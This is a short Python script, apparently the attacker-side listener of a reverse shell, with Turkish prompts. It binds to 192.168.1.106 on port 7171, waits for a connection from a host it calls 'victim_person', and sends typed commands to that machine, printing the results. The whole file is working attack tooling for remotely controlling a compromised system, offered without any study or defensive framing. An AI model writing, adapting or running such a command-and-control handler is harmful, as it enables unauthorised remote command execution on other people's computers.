#! /usr/bin/env python
# encoding:utf-8
import socket
import subprocess
import json

def send_data(data):
    json_data = json.dumps(data)
    victim_person.send(json_data.encode())

def get_data():
    json_data = ""
    while True:
        try:
            get_data_all = victim_person.recv(2048)
            json_data = json_data + get_data_all.decode()
            return json.loads(json_data)
        except ValueError:
            continue

def connect():
    global socket_connection
    global victim_person
    global ip

    socket_connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    socket_connection.bind(("192.168.1.106", 7171))
    socket_connection.listen(1)

    print("Hedef sistemin bağlantı kurması bekleniyor...")
    victim_person, ip=socket_connection.accept()
    print("Hedef sistem ile bağlantı sağlandı.")
    print("Hedef sistem bilgileri : %s" % str(ip))
    print("[0] ==> Programı Sonlandır")

def commands():
    while True:
        code = input("Komut Gir : ")
        send_data(code)

        if code == "0":
            print("Sunucu Kapatıldı.")
            break

        else:
            result = get_data()
            print(result)

connect()
commands()
socket_connection.close()